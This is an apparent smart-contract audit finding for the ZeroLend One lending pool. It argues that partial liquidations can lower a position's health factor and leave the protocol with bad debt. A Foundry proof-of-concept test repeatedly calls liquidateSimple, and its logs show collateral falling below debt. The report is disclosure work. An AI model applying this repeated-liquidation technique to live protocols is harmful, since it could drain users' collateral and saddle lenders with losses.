Soft Rose Cod

High

# Partial liquidations can sometimes lower a positions health and lead to guaranteed bad debt

### Summary

Partial liquidations are allowed when a users healthFactor ```.95 < healthFactor < 1```. When users have a single asset as collateral this often leads to a position having a decreased health factor after liquidation. The user can be repeatedly liquidated and the protocol guaranteed bad debt.

### Root Cause
The cases where a position's health factor decreases can be derived as follows:
Partial liquidation percent: 50%
Liquidator discount K: 5%
C: initial collateral value
D: initial debt value
LT: Liquidation threshold
Initial Health factor = (C * LT) / D < 1
After partial Liquidation:
New Debt: D' = D * 0.5
Liquidated Collateral: L = (D * 0.5)/(1 - K)
New Collateral: C' = C-L
New Health Factor = (C' * LT)/D'
For the health factor to increase the following inequality must hold:
(C' * LT) / D' > (C * LT) / D
(C - L)  > C * 0.5
 (C - (D * 0.5)/(1 - K) > C * 0.5
-(D * 0.5 / (1 -  K)) > -C * 0.5
D * 0.5 / (1 - K) < C * 0.5
D / (1 - K) < C
(1 - K ) > D / C
C / D > 1 / (1 - K) 
In other words, liquidation only leads to an increase in the health factor when there is enough collateral to pay off the discount. This inequality is more likely to be unsatisfied with higher LTV assets since the C / D value will be lower.

### Internal pre-conditions
1. User must be liquidatable (HF < 1)
2. If the following inequality doesn't hold, then the liquidation will cause a decrease in health factor.
C / D > 1 / (1 - K) 

### External pre-conditions

1. A users collateral must drop in price sufficiently for them to be liquidatable

### Attack Path

1. User position health factor drops below 1
2. User gets partially liquidated
3. Liquidation decreases the health factor
4. Liquidation is repeated until all collateral drained and only bad debt remains

### Impact

1. A position will end up less healthy after liquidation than before. This will lead to repeated liquidations and guaranteed accrual of bad debt for the protocol. This issue is more prevalent in higher LTV (safer) assets since the C / D ratio will be lower.
2. The partial liquidation mechanism can be bypassed since the liquidation mechanisms intention is to increase a positions HF beyond 1. However, this doesn't happen in this edge case so a previously liquidated position can still be liquidatable and can be repeatedly liquidated. Essentially bypassing the following close factor limitations:
https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L266C1-L267C1
```solidity    
uint256 closeFactor = healthFactor > CLOSE_FACTOR_HF_THRESHOLD ? DEFAULT_LIQUIDATION_CLOSE_FACTOR : MAX_LIQUIDATION_CLOSE_FACTOR;
```
### PoC
1. set the PoolSetup.sol#_basicPoolInitParams function to the following. This is to change the LTV's/liquidation thresholds of the assets.
```solidity
  function _basicPoolInitParams() internal view returns (DataTypes.InitPoolParams memory p) {

    address[] memory assets = new address[](4);
    assets[0] = address(tokenA);
    assets[1] = address(tokenB);
    assets[2] = address(tokenC);
    assets[3] = address(wethToken);

    address[] memory rateStrategyAddresses = new address[](4);
    rateStrategyAddresses[0] = address(irStrategy);
    rateStrategyAddresses[1] = address(irStrategy);
    rateStrategyAddresses[2] = address(irStrategy);
    rateStrategyAddresses[3] = address(irStrategy);

    address[] memory sources = new address[](4);
    sources[0] = address(oracleA);
    sources[1] = address(oracleB);
    sources[2] = address(oracleC);
    sources[3] = address(oracleD);

    DataTypes.InitReserveConfig memory config = _basicConfig();

    DataTypes.InitReserveConfig[] memory configurationLocal = new DataTypes.InitReserveConfig[](4);
    DataTypes.InitReserveConfig memory configA = DataTypes.InitReserveConfig({
      ltv: 9000,
      liquidationThreshold: 9500,
      liquidationBonus: 10_500,
      decimals: 18,
      frozen: false,
      borrowable: true,
      borrowCap: 0,
      supplyCap: 0
    });

    DataTypes.InitReserveConfig memory configC = DataTypes.InitReserveConfig({
      ltv: 5000,
      liquidationThreshold: 8000,
      liquidationBonus: 10_500,
      decimals: 18,
      frozen: false,
      borrowable: true,
      borrowCap: 0,
      supplyCap: 0
    });
    configurationLocal[0] = configA;
    configurationLocal[1] = config;
    configurationLocal[2] = configC;
    configurationLocal[3] = config;

    address[] memory admins = new address[](1);
    admins[0] = address(this);

    p = DataTypes.InitPoolParams({
      proxyAdmin: address(this),
      revokeProxy: false,
      admins: admins,
      emergencyAdmins: new address[](0),
      riskAdmins: new address[](0),
      hook: address(0),
      assets: assets,
      rateStrategyAddresses: rateStrategyAddresses,
      sources: sources,
      configurations: configurationLocal
    });
  }
```
2. place the following test inside NFTPositionManagerTest.t.sol
```solidity
  function test_doubleLiquidateBug() public {
    uint256 mintAmount = 100 ether;
    uint256 supplyAmount = 1 ether;
    uint256 tokenId = 1;

    //approvals
    _mintAndApprove(alice, tokenA, 1000 ether, address(pool)); // alice 1000 tokenA
    _mintAndApprove(alice, tokenB, 1000 ether, address(pool)); // alice 1000 tokenB
    _mintAndApprove(alice, tokenC, 1000 ether, address(pool)); // alice 1000 tokenC
    _mintAndApprove(bob, tokenB, 5000 ether, address(pool)); // bob 2000 tokenB


    DataTypes.ExtraData memory data = DataTypes.ExtraData(bytes(''), bytes(''));
    INFTPositionManager.AssetOperationParams memory aliceSupplyA =
      INFTPositionManager.AssetOperationParams(address(tokenA), alice, 1000 ether, tokenId, data);
    INFTPositionManager.AssetOperationParams memory aliceBorrowB =
      INFTPositionManager.AssetOperationParams(address(tokenB), alice, 750 ether, tokenId, data);
    INFTPositionManager.AssetOperationParams memory bobSupplyB =
      INFTPositionManager.AssetOperationParams(address(tokenB), bob, 2000 ether, 2, data);
    oracleA.updateAnswer(1e8);
    oracleB.updateAnswer(1e8);

    vm.startPrank(alice);
    tokenA.approve(address(nftPositionManager), 100000 ether);
    tokenB.approve(address(nftPositionManager), 100000 ether);
    tokenC.approve(address(nftPositionManager), 100000 ether);
    nftPositionManager.mint(address(pool));
    nftPositionManager.supply(aliceSupplyA);
    vm.stopPrank();

    vm.startPrank(bob);
    tokenA.approve(address(pool), 100000 ether);
    tokenB.approve(address(pool), 100000 ether);
    tokenC.approve(address(pool), 100000 ether);
    tokenA.approve(address(nftPositionManager), 100000 ether);
    tokenB.approve(address(nftPositionManager), 100000 ether);
    tokenC.approve(address(nftPositionManager), 100000 ether);
    nftPositionManager.mint(address(pool));
    nftPositionManager.supply(bobSupplyB);
    vm.stopPrank();

    vm.startPrank(alice);
    nftPositionManager.borrow(aliceBorrowB);
    vm.stopPrank();

    uint256 balanceBefore = tokenA.balanceOf(bob);
    oracleA.updateAnswer(7800e4);

    (uint256 collBeforeAnyLiquidation,uint256 debtBeforeAnyLiquidation,,,,uint256 healthFactorBeforeAnyLiquidation) = pool.getUserAccountData(address(nftPositionManager), 1);
    uint256 ratioBeforeAnyLiquidation = debtBeforeAnyLiquidation*1e18/collBeforeAnyLiquidation;
    console.log("d / c < .95 => %e / %e = %e", debtBeforeAnyLiquidation,collBeforeAnyLiquidation, ratioBeforeAnyLiquidation);
    console.log("ratio < 0.95 => %e < %e => %s", ratioBeforeAnyLiquidation, 0.95e18, ratioBeforeAnyLiquidation < 0.95e18);

    bytes32 pos = keccak256(abi.encodePacked(nftPositionManager, 'index', uint256(1)));
    console.log("alice HF before any liquidations: %e\n", healthFactorBeforeAnyLiquidation);


    vm.startPrank(bob);
    //stack too deep prevention
    {
            pool.liquidateSimple(address(tokenA), address(tokenB), pos, 10000e18);
            uint256 balanceAfterFirstLiquidation = tokenA.balanceOf(bob);
            (uint256 collAfterFirstLiquidation,uint256 debtAfterFirstLiquidation,,,,uint256 healthFactorAfterFirstLiquidation) = pool.getUserAccountData(address(nftPositionManager), 1);
            uint256 ratioAfterFirstLiquidation = debtAfterFirstLiquidation*1e18/collAfterFirstLiquidation;
            console.log("bad debt: %s", collAfterFirstLiquidation < debtAfterFirstLiquidation);
            console.log("d / c < .95 => %e / %e = %e", debtAfterFirstLiquidation,collAfterFirstLiquidation, ratioAfterFirstLiquidation);
            console.log("ratio < 0.95 => %e < %e => %s", ratioAfterFirstLiquidation, 0.95e18, ratioAfterFirstLiquidation < 0.95e18);

            console.log("alice HF after first liquidation: %e", healthFactorAfterFirstLiquidation);
            console.log("Total amount liquidated: %e\n", balanceAfterFirstLiquidation-balanceBefore);
    }

    {
            pool.liquidateSimple(address(tokenA), address(tokenB), pos, 10000e18);
            uint256 balanceAfterSecondLiquidation = tokenA.balanceOf(bob);
            (uint256 collAfterSecondLiquidation,uint256 debtAfterSecondLiquidation,,,,uint256 healthFactorAfterSecondLiquidation) = pool.getUserAccountData(address(nftPositionManager), 1);
            uint256 ratioAfterSecondLiquidation = debtAfterSecondLiquidation*1e18/collAfterSecondLiquidation;
            console.log("bad debt: %s", collAfterSecondLiquidation < debtAfterSecondLiquidation);
            console.log("d / c < .95 => %e / %e = %e", debtAfterSecondLiquidation,collAfterSecondLiquidation, ratioAfterSecondLiquidation);
            console.log("ratio < 0.95 => %e < %e => %s", ratioAfterSecondLiquidation, 0.95e18, ratioAfterSecondLiquidation < 0.95e18);

            console.log("alice HF after second liquidation: %e", healthFactorAfterSecondLiquidation);
            console.log("Total amount liquidated: %e\n", balanceAfterSecondLiquidation-balanceBefore);
     }

    {
            pool.liquidateSimple(address(tokenA), address(tokenB), pos, 10000e18);
            uint256 balanceAfterThirdLiquidation = tokenA.balanceOf(bob);
            (uint256 collAfterThirdLiquidation,uint256 debtAfterThirdLiquidation,,,,uint256 healthFactorAfterThirdLiquidation) = pool.getUserAccountData(address(nftPositionManager), 1);
            uint256 ratioAfterThirdLiquidation = debtAfterThirdLiquidation*1e18/collAfterThirdLiquidation;
            console.log("bad debt: %s", collAfterThirdLiquidation < debtAfterThirdLiquidation);
            console.log("d / c < .95 => %e / %e = %e", debtAfterThirdLiquidation,collAfterThirdLiquidation, ratioAfterThirdLiquidation);
            console.log("ratio < 0.95 => %e < %e => %s", ratioAfterThirdLiquidation, 0.95e18, ratioAfterThirdLiquidation < 0.95e18);

            console.log("alice HF after second liquidation: %e", healthFactorAfterThirdLiquidation);
            console.log("Total amount liquidated: %e\n", balanceAfterThirdLiquidation-balanceBefore);
    }
    vm.stopPrank();
  }
```

Logs: 
  d / c < .95 => 7.5e10 / 7.8e10 = 9.61538461538461538e17
  ratio < 0.95 => 9.61538461538461538e17 < 9.5e17 => false
  alice HF before any liquidations: 9.88e17

  bad debt: false
  d / c < .95 => 3.75e10 / 3.8625e10 = 9.7087378640776699e17
  ratio < 0.95 => 9.7087378640776699e17 < 9.5e17 => false
  alice HF after first liquidation: 9.785e17
  Total amount liquidated: 5.04807692307692307692e20

  bad debt: false
  d / c < .95 => 1.875e10 / 1.89375e10 = 9.90099009900990099e17
  ratio < 0.95 => 9.90099009900990099e17 < 9.5e17 => false
  alice HF after second liquidation: 9.595e17
  Total amount liquidated: 7.57211538461538461538e20

  bad debt: true
  d / c < .95 => 9.375e9 / 9.09375e9 = 1.030927835051546391e18
  ratio < 0.95 => 1.030927835051546391e18 < 9.5e17 => false
  alice HF after second liquidation: 9.215e17
  Total amount liquidated: 8.8341346153846153846e20

The test shows how after subsequent liquidations, the health factor fails to improve after several liquidations. The position is both unhealthier after each liquidation, and the user is being liquidated beyond 50% of their debt when their ```HF > 0.95```. Eventually, after the 3rd liquidation the protocol is left with bad debt (collateral < debt)
 
### Mitigation

Do not allow partial liquidations when the inequality is unfavorable. Consider disallowing liquidations if they decrease the health factor.